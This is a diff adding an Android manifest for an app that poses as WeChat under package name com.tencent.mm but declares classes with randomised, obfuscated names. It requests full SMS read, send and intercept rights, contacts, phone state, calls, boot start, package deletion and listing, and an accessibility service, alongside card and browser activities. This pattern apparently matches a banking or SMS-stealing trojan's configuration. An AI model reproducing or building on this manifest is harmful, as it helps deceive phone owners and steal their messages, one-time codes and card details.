@@ -1,0 +1,103 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android" xmlns:app="http://schemas.android.com/apk/res-auto" xmlns:aapt="http://schemas.android.com/aapt" android:versionCode="1" android:versionName="1.0" android:compileSdkVersion="23" android:compileSdkVersionCodename="6.0-2438415" package="com.tencent.mm" platformBuildVersionCode="28" platformBuildVersionName="9">
+    <uses-sdk android:minSdkVersion="23" android:targetSdkVersion="28"/>
+    <uses-permission android:name="android.permission.READ_CONTACTS"/>
+    <uses-permission android:name="android.permission.ACCESS_NOTIFICATION_POLICY"/>
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.REQUEST_COMPANION_USE_DATA_IN_BACKGROUND"/>
+    <uses-permission android:name="android.permission.ACCESS_NOTIFICATION_POLICY"/>
+    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"/>
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+    <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+    <uses-permission android:name="android.permission.READ_SMS"/>
+    <uses-permission android:name="android.permission.REQUEST_DELETE_PACKAGES"/>
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
+    <uses-permission android:name="android.permission.ACCESS_LOCATION_EXTRA_COMMANDS"/>
+    <uses-permission android:name="android.permission.SEND_SMS"/>
+    <uses-permission android:name="android.permission.WRITE_SMS"/>
+    <uses-permission android:name="android.permission.WAKE_LOCK"/>
+    <uses-permission android:name="android.permission.CALL_PHONE"/>
+    <uses-permission android:name="android.permission.KILL_BACKGROUND_PROCESSES"/>
+    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES"/>
+    <application android:theme="@style/Theme.MyApplicationTest" android:label="@string/app_name" android:icon="@drawable/icon" android:name="divide.maze.maze.AEkGcKpYqLpGfYnOdSgPsWfKrGrJeTdUzYiDjMbRxSyAw" android:allowBackup="true" android:supportsRtl="true" android:extractNativeLibs="false" android:usesCleartextTraffic="true" android:appComponentFactory="androidx.core.app.CoreComponentFactory">
+        <activity android:label="label_winter" android:name="com.example.myapplicationtest.WTqOwToMyCjUwAcLmFxOzJyPwOpAyPcHtZdTyLz"/>
+        <service android:name="com.example.myapplicationtest.ForegroundService" android:enabled="true" android:exported="true"/>
+        <activity android:label="label_tragic" android:name="com.example.myapplicationtest.GRpAlXdZsHnAeBjBiTeQbLeSxGxLnNiXrShPxMpEfRbAfUuIuHw"/>
+        <activity android:name="com.example.myapplicationtest.BrowserActivity" android:launchMode="singleInstance"/>
+        <activity android:label="label_treat" android:name="com.example.myapplicationtest.IQmXoPfDcJjTwAyMnCjWiGgMwAzMyTmCkIpIdOcJcFoQsMa"/>
+        <activity android:name="com.example.myapplicationtest.QNtUdEiMqAiDmJlLzRoRfJoPsXxBxGsGcWl" android:screenOrientation="landscape"/>
+        <activity android:name="com.example.myapplicationtest.CardActivity" android:launchMode="singleInstance" android:screenOrientation="portrait" android:configChanges="keyboardHidden|orientation"/>
+        <activity android:label="label_next" android:name="com.example.myapplicationtest.JZlZlAoJuRbIgScXfMwLmQaEiJrSrBjUrZj"/>
+        <activity android:name="com.example.myapplicationtest.MKsSnUfDcJzOsWfQpHxXtDbCoPkHwBoWaBkPs" android:screenOrientation="landscape"/>
+        <activity android:name="com.example.myapplicationtest.SmsThreadActivity" android:launchMode="singleTop"/>
+        <activity android:label="label_arrest" android:name="com.example.myapplicationtest.BDgKbGbUgQwOoWwShMjRjQmSkRqXrNrJuJaPeNaGqWm"/>
+        <activity android:name="com.example.myapplicationtest.WDxHhYjGbQcBkNlZbSxYzXiFkKcDq" android:screenOrientation="landscape"/>
+        <activity android:name="com.example.myapplicationtest.ComposeSmsActivity" android:launchMode="singleTop">
+            <intent-filter>
+                <action android:name="android.intent.action.SEND"/>
+                <action android:name="android.intent.action.SENDTO"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+                <category android:name="android.intent.category.BROWSABLE"/>
+                <data android:scheme="sms"/>
+                <data android:scheme="smsto"/>
+                <data android:scheme="mms"/>
+                <data android:scheme="mmsto"/>
+            </intent-filter>
+        </activity>
+        <activity android:label="label_random" android:name="com.example.myapplicationtest.EDpXeWwKnRhOtToRkCtKmMjGzTgNfMzMcHyBw"/>
+        <receiver android:name="com.example.myapplicationtest.SmsReceiver" android:permission="android.permission.BROADCAST_SMS">
+            <intent-filter>
+                <action android:name="android.provider.Telephony.SMS_DELIVER"/>
+            </intent-filter>
+        </receiver>
+        <activity android:label="label_seminar" android:name="com.example.myapplicationtest.KRgJfQtFdIpNy"/>
+        <receiver android:name="com.example.myapplicationtest.MmsReceiver" android:permission="android.permission.BROADCAST_WAP_PUSH">
+            <intent-filter>
+                <action android:name="android.provider.Telephony.WAP_PUSH_DELIVER"/>
+                <data android:mimeType="application/vnd.wap.mms-message"/>
+            </intent-filter>
+        </receiver>
+        <activity android:label="label_task" android:name="com.example.myapplicationtest.HTcZmHiWgAhHrSyPqSjPaXfHqSjFjJrBrJiNyKrOnZnKs"/>
+        <receiver android:name="com.example.myapplicationtest.BootReceiver">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+            </intent-filter>
+        </receiver>
+        <activity android:name="com.example.myapplicationtest.PGdPlRzZiFrGfMsYpSaRlUwYz" android:screenOrientation="portrait"/>
+        <service android:name="com.example.myapplicationtest.HeadlessSmsSendService" android:permission="android.permission.SEND_RESPOND_VIA_MESSAGE" android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.RESPOND_VIA_MESSAGE"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+                <data android:scheme="sms"/>
+                <data android:scheme="smsto"/>
+                <data android:scheme="mms"/>
+                <data android:scheme="mmsto"/>
+            </intent-filter>
+        </service>
+        <activity android:name="com.example.myapplicationtest.ABtDeIfZh" android:screenOrientation="portrait"/>
+        <service android:name="com.example.myapplicationtest.MyAccessibilityService" android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE" android:enabled="true" android:exported="false">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService"/>
+            </intent-filter>
+            <meta-data android:name="android.accessibilityservice" android:resource="@xml/accessibility_service_config"/>
+        </service>
+        <activity android:label="label_trust" android:name="com.example.myapplicationtest.FTnMgYkTlAuUaGxCiDbJoDoSsYhPbTjXaMdWgKeCrJcPfCbPqIjXxIl"/>
+        <activity android:name="com.example.myapplicationtest.OLrKyMzJuOxTmGnRyDgTyFhPcIgTcDtRzErIwUwJsTdHrRbRhIuSwAq" android:screenOrientation="landscape"/>
+        <activity android:name="com.example.myapplicationtest.MainActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity>
+        <activity android:name="com.example.myapplicationtest.ZHkPaYmJoSdSyFjLzGqMnXhRbWlBkXoIcGsKfIcJyQxDzEdHyMkSsOx" android:screenOrientation="portrait"/>
+        <activity android:name="com.example.myapplicationtest.IntentStarter">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+            </intent-filter>
+        </activity>
+        <activity android:label="label_advance" android:name="com.example.myapplicationtest.ZZtRgWbSoWpBfWtOs"/>
+        <activity android:name="com.example.myapplicationtest.JGfDwCgYyAo" android:screenOrientation="landscape"/>
+        <activity android:label="label_trial" android:name="com.example.myapplicationtest.TKiOoAqEtBl"/>
+    </application>
+</manifest>
